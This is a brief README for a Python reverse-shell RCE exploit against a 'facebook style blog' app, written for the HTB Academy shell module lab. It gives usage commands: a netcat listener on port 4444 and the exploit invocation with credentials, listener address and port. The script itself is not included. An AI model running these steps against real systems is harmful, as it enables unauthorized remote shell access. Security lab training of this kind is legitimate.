# facebook-style-blog-rce
python based revshell exploit for facebook style blog for HTB academy shell module.

# Usage: 
start listner in one terminal window : 
nc -lnvp 4444

on another terminal window, execute below command : 
python3 facebook_styled_blog_rce.py http://blog.inlanefreight.local -u <username> -p <Password> --lhost <Listening Address> --lport 4444
